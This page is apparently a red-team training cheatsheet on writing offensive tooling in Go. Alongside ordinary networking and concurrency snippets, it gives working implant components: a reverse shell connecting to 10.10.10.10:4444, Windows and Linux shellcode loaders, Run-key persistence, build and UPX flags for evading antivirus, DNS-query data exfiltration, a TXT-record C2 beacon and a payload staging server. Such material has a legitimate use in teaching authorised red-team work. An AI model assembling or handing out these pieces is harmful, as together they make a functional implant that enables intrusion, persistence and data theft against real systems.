---
layout: training-page
title: "Go Red Team Cheatsheet — Red Team Academy"
module: "Programming"
tags:
  - golang
  - cheatsheet
  - red-team
  - offensive-programming
page_key: "prog-go-cheatsheet"
render_with_liquid: false
---

# Go Red Team Cheatsheet

Quick reference for offensive Go programming. Assumes Go 1.22+. All patterns here are used in real tooling — port scanners, C2 clients, droppers, and post-ex utilities.

---

## 1. Project Setup

```bash
# Initialize a module
go mod init github.com/yourhandle/toolname

# Tidy dependencies after editing imports
go mod tidy

# Useful red team modules
go get golang.org/x/sys
go get github.com/gorilla/websocket
go get github.com/gorilla/mux
```

**Recommended module layout for a standalone implant:**

```
toolname/
├── go.mod
├── go.sum
├── main.go
└── internal/
    ├── comms/
    └── exec/
```

**Build tags** let you switch behavior at compile time without touching code:

```go
//go:build windows

package exec

// Windows-only implementation
```

```bash
# Build only files matching the tag
GOOS=windows go build -tags windows .
```

---

## 2. Cross-Compilation

Go cross-compilation is first-class. Set `GOOS` and `GOARCH` before building.

```bash
# Common targets
GOOS=linux   GOARCH=amd64  go build -o implant_linux   .
GOOS=windows GOARCH=amd64  go build -o implant.exe      .
GOOS=darwin  GOARCH=arm64  go build -o implant_macos    .

# Strip debug symbols and DWARF — reduces size, removes function names
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o implant.exe .

# Fully static binary (no CGO, no libc dep)
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o implant_static .

# Combine: static + stripped
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -trimpath -o implant.exe .
```

**GOOS/GOARCH matrix for red team targets:**

| Target OS | GOOS    | GOARCH  | Notes                        |
|-----------|---------|---------|------------------------------|
| Windows x64 | windows | amd64 | Most enterprise desktops     |
| Windows ARM  | windows | arm64 | Surface Pro, newer laptops   |
| Linux x64    | linux   | amd64 | Servers, VMs, containers     |
| Linux ARM64  | linux   | arm64 | Raspberry Pi, cloud ARM      |
| macOS Intel  | darwin  | amd64 | Older Macs                   |
| macOS Apple  | darwin  | arm64  | M1/M2/M3 Macs                |

---

## 3. net Package Patterns

```go
package main

import (
    "bufio"
    "context"
    "fmt"
    "io"
    "net"
    "time"
)

// Basic TCP dial with timeout
func dialTCP(host, port string, timeout time.Duration) (net.Conn, error) {
    return net.DialTimeout("tcp", net.JoinHostPort(host, port), timeout)
}

// Listen on a port (bind shell style)
func listenTCP(port string) (net.Conn, error) {
    ln, err := net.Listen("tcp", ":"+port)
    if err != nil {
        return nil, err
    }
    return ln.Accept() // blocks until connection
}

// Read lines from a connection
func readLines(conn net.Conn) {
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        fmt.Println(scanner.Text())
    }
}

// Pipe two connections together (TCP proxy core)
func bridge(a, b net.Conn) {
    done := make(chan struct{}, 2)
    copy := func(dst, src net.Conn) {
        io.Copy(dst, src)
        done <- struct{}{}
    }
    go copy(a, b)
    go copy(b, a)
    <-done
}

// Context-aware dial for cancellation
func dialWithContext(ctx context.Context, address string) (net.Conn, error) {
    var d net.Dialer
    return d.DialContext(ctx, "tcp", address)
}

// Resolve a hostname
func resolve(host string) ([]string, error) {
    addrs, err := net.LookupHost(host)
    return addrs, err
}
```

---

## 4. Concurrency for Scanning

### WaitGroup + Goroutine Pool

```go
package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

func scanPorts(host string, ports []int, concurrency int, timeout time.Duration) []int {
    var (
        mu      sync.Mutex
        wg      sync.WaitGroup
        open    []int
        sem     = make(chan struct{}, concurrency) // semaphore
    )

    for _, port := range ports {
        wg.Add(1)
        sem <- struct{}{} // acquire slot
        go func(p int) {
            defer wg.Done()
            defer func() { <-sem }() // release slot

            addr := fmt.Sprintf("%s:%d", host, p)
            conn, err := net.DialTimeout("tcp", addr, timeout)
            if err == nil {
                conn.Close()
                mu.Lock()
                open = append(open, p)
                mu.Unlock()
            }
        }(port)
    }

    wg.Wait()
    return open
}
```

### Channel-based Fan-out

```go
func fanOut(jobs <-chan int, results chan<- int, host string, timeout time.Duration) {
    for port := range jobs {
        addr := fmt.Sprintf("%s:%d", host, port)
        conn, err := net.DialTimeout("tcp", addr, timeout)
        if err == nil {
            conn.Close()
            results <- port
        }
    }
}

func runScan(host string, ports []int, workers int) []int {
    jobs := make(chan int, len(ports))
    results := make(chan int, len(ports))

    for i := 0; i < workers; i++ {
        go fanOut(jobs, results, host, 2*time.Second)
    }
    for _, p := range ports {
        jobs <- p
    }
    close(jobs)

    var open []int
    for range ports {
        if p := <-results; p != 0 {
            open = append(open, p)
        }
    }
    return open
}
```

---

## 5. os/exec Interaction

```go
package main

import (
    "bytes"
    "fmt"
    "os/exec"
    "runtime"
)

// Run a command and capture combined output
func run(name string, args ...string) (string, error) {
    out, err := exec.Command(name, args...).CombinedOutput()
    return string(out), err
}

// Cross-platform shell execution
func shell(command string) (string, error) {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    var out bytes.Buffer
    cmd.Stdout = &out
    cmd.Stderr = &out
    err := cmd.Run()
    return out.String(), err
}

// Pipe stdin into a command
func pipeInput(command, input string) (string, error) {
    cmd := exec.Command("/bin/sh", "-c", command)
    cmd.Stdin = bytes.NewBufferString(input)
    out, err := cmd.CombinedOutput()
    return string(out), err
}

// Start a process and get its stdout/stderr pipes
func startWithPipes() error {
    cmd := exec.Command("cat")
    stdout, _ := cmd.StdoutPipe()
    stdin, _ := cmd.StdinPipe()
    if err := cmd.Start(); err != nil {
        return err
    }
    fmt.Fprintln(stdin, "hello from implant")
    stdin.Close()
    var buf bytes.Buffer
    buf.ReadFrom(stdout)
    fmt.Println(buf.String())
    return cmd.Wait()
}
```

---

## 6. Windows API via syscall / golang.org/x/sys

```go
package main

import (
    "fmt"
    "unsafe"

    "golang.org/x/sys/windows"
)

// Load a DLL and call a procedure
func callMessageBox() error {
    user32 := windows.NewLazySystemDLL("user32.dll")
    msgBox := user32.NewProc("MessageBoxW")

    title, _ := windows.UTF16PtrFromString("Alert")
    msg, _ := windows.UTF16PtrFromString("Hello from Go")

    ret, _, _ := msgBox.Call(
        0,
        uintptr(unsafe.Pointer(msg)),
        uintptr(unsafe.Pointer(title)),
        0,
    )
    fmt.Printf("MessageBox returned: %d\n", ret)
    return nil
}

// VirtualAlloc / VirtualProtect / CreateThread for shellcode execution
// NOTE: Only call with shellcode you own — for testing on your own lab systems.
func execShellcode(shellcode []byte) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    virtualAlloc := kernel32.NewProc("VirtualAlloc")
    virtualProtect := kernel32.NewProc("VirtualProtect")
    createThread := kernel32.NewProc("CreateThread")

    // MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
    addr, _, err := virtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        0x3000,
        0x04,
    )
    if addr == 0 {
        return fmt.Errorf("VirtualAlloc failed: %w", err)
    }

    // Copy shellcode into allocated memory
    dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
    copy(dst, shellcode)

    // Change protection to PAGE_EXECUTE_READ = 0x20
    var oldProtect uint32
    virtualProtect.Call(addr, uintptr(len(shellcode)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))

    // Create a thread at the shellcode address
    thread, _, err := createThread.Call(0, 0, addr, 0, 0, 0)
    if thread == 0 {
        return fmt.Errorf("CreateThread failed: %w", err)
    }

    // Wait for thread (optional)
    windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
    return nil
}
```

---

## 7. HTTP Client Patterns

```go
package main

import (
    "crypto/tls"
    "io"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "time"
)

// HTTP client with TLS skip verify (for self-signed C2 certs)
func insecureClient() *http.Client {
    transport := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    return &http.Client{
        Transport: transport,
        Timeout:   15 * time.Second,
    }
}

// HTTP client routing through a proxy
func proxyClient(proxyURL string) (*http.Client, error) {
    proxy, err := url.Parse(proxyURL)
    if err != nil {
        return nil, err
    }
    transport := &http.Transport{
        Proxy:           http.ProxyURL(proxy),
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    return &http.Client{Transport: transport, Timeout: 30 * time.Second}, nil
}

// HTTP client that respects system proxy env vars (HTTP_PROXY, HTTPS_PROXY)
func envProxyClient() *http.Client {
    transport := &http.Transport{
        Proxy: http.ProxyFromEnvironment,
    }
    return &http.Client{Transport: transport}
}

// GET with custom headers and cookie jar (session maintenance)
func getWithSession(targetURL string, cookies []*http.Cookie) (string, error) {
    jar, _ := cookiejar.New(nil)
    client := &http.Client{Jar: jar, Timeout: 10 * time.Second}

    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        return "", err
    }
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    req.Header.Set("X-Forwarded-For", "127.0.0.1")

    u, _ := url.Parse(targetURL)
    jar.SetCookies(u, cookies)

    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    body, _ := io.ReadAll(resp.Body)
    return string(body), nil
}
```

---

## 8. File and Registry Operations

```go
package main

import (
    "fmt"
    "os"
    "path/filepath"
)

// Read entire file
func readFile(path string) ([]byte, error) {
    return os.ReadFile(path)
}

// Write bytes to a file
func writeFile(path string, data []byte) error {
    return os.WriteFile(path, data, 0600)
}

// Recursively walk a directory and collect .config files
func findConfigs(root string) ([]string, error) {
    var found []string
    err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return nil // skip permission errors
        }
        if !info.IsDir() && filepath.Ext(path) == ".config" {
            found = append(found, path)
        }
        return nil
    })
    return found, err
}

// Append to a file (useful for logging)
func appendFile(path, line string) error {
    f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
    if err != nil {
        return err
    }
    defer f.Close()
    _, err = fmt.Fprintln(f, line)
    return err
}
```

**Windows Registry** — use `golang.org/x/sys/windows/registry`:

```go
//go:build windows

package main

import "golang.org/x/sys/windows/registry"

func readRunKey(name string) (string, error) {
    k, err := registry.OpenKey(
        registry.CURRENT_USER,
        `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
        registry.QUERY_VALUE,
    )
    if err != nil {
        return "", err
    }
    defer k.Close()
    val, _, err := k.GetStringValue(name)
    return val, err
}

func addRunKey(name, value string) error {
    k, _, err := registry.CreateKey(
        registry.CURRENT_USER,
        `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
        registry.SET_VALUE,
    )
    if err != nil {
        return err
    }
    defer k.Close()
    return k.SetStringValue(name, value)
}
```

---

## 9. Build Flags for Evasion

```bash
# Suppress console window on Windows (GUI subsystem)
GOOS=windows go build -ldflags "-H windowsgui -s -w" -o agent.exe .

# Remove all debug info + shrink binary
go build -ldflags "-s -w" -trimpath -o agent .

# After build: UPX compression (if UPX is available on operator machine)
# Note: UPX signatures are detected by some AV — test in your lab first
upx --best --ultra-brute agent.exe

# Conditional compilation via build tags
# File: syscall_windows.go
//go:build windows

// File: syscall_linux.go
//go:build linux
```

**Build tag examples for platform-specific payloads:**

```go
//go:build windows && amd64

package main

// This file only compiles on 64-bit Windows
```

```bash
# Explicit tag at build time
go build -tags "debug" -o agent_debug .
```

---

## 10. Useful One-Liners and Patterns

### Simple HTTP File Server (for staging payloads)

```go
package main

import (
    "log"
    "net/http"
)

func main() {
    log.Fatal(http.ListenAndServe(":8080", http.FileServer(http.Dir("."))))
}
```

### TCP Port Forwarder (one-line core)

```go
package main

import (
    "io"
    "log"
    "net"
)

func main() {
    ln, _ := net.Listen("tcp", ":4444")
    for {
        src, _ := ln.Accept()
        dst, err := net.Dial("tcp", "10.0.0.1:22")
        if err != nil {
            src.Close()
            continue
        }
        go func() { defer src.Close(); defer dst.Close(); io.Copy(dst, src) }()
        go func() { defer src.Close(); defer dst.Close(); io.Copy(src, dst) }()
    }
}
```

### In-Memory Shellcode Execution Skeleton (Linux, mmap)

```go
//go:build linux

package main

import (
    "log"
    "syscall"
    "unsafe"
)

func main() {
    // Placeholder — replace with actual shellcode bytes in your test lab
    shellcode := []byte{0x90, 0x90, 0xcc} // NOP NOP INT3

    mem, err := syscall.Mmap(
        -1, 0, len(shellcode),
        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
        syscall.MAP_ANON|syscall.MAP_PRIVATE,
    )
    if err != nil {
        log.Fatal(err)
    }
    copy(mem, shellcode)

    fn := *(*func())(unsafe.Pointer(&mem))
    fn()
}
```

### Reverse Shell Skeleton

```go
package main

import (
    "net"
    "os/exec"
)

func main() {
    conn, err := net.Dial("tcp", "10.10.10.10:4444")
    if err != nil {
        return
    }
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.Run()
}
```

### Generate Random Bytes (for keys, session IDs)

```go
package main

import (
    "crypto/rand"
    "encoding/hex"
    "fmt"
)

func randomHex(n int) string {
    b := make([]byte, n)
    rand.Read(b)
    return hex.EncodeToString(b)
}

func main() {
    fmt.Println(randomHex(16)) // 32-char hex session token
}
```

### DNS Lookup for C2 Beaconing

```go
package main

import (
    "encoding/base64"
    "fmt"
    "net"
    "strings"
)

// Encode data into a DNS query label (DNS tunneling concept)
func dnsExfil(data, domain string) (string, error) {
    encoded := base64.RawURLEncoding.EncodeToString([]byte(data))
    query := encoded + "." + domain
    _, err := net.LookupHost(query)
    return query, err
}

// Simple TXT record beacon check
func checkBeacon(domain string) (string, error) {
    txts, err := net.LookupTXT(domain)
    if err != nil {
        return "", err
    }
    return strings.Join(txts, ""), nil
}

func main() {
    cmd, err := checkBeacon("beacon.c2.example.com")
    if err == nil {
        fmt.Println("Received command:", cmd)
    }
}
```

---

## Resources

- Go standard library reference: https://pkg.go.dev/std
- golang.org/x/sys package: https://pkg.go.dev/golang.org/x/sys
- golang.org/x/sys Windows registry: https://pkg.go.dev/golang.org/x/sys/windows/registry
- gorilla/websocket: https://github.com/gorilla/websocket
- gorilla/mux: https://github.com/gorilla/mux
- Go cross-compilation guide: https://go.dev/doc/install/source#environment
- Go build flags reference: https://pkg.go.dev/cmd/go#hdr-Compile_packages_and_dependencies
